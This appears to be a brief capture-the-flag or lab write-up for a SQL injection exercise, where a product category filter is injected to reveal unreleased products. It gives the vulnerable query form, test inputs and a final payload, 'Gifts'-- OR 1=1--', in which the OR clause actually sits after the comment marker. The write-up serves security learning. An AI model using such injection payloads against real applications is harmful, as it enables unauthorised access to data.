# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### Goal: Cause the application to display one or more unreleased products

### Info: The injection point is the product category filter
`target.com/filter?category=<input>`
### Info: The query is in the form
`SELECT * FROM products WHERE category = '<input>' AND released = 1`

#### **<ins>Step 1: Test injection point</ins>**

category=Gifts'

    500: server error

category=Gifts'--

    200

This confirms that the server is inserting our input directly into the query

#### **<ins>Step 2: Achieve goal</ins>**

category=Gifts'-- OR 1=1--

    Success!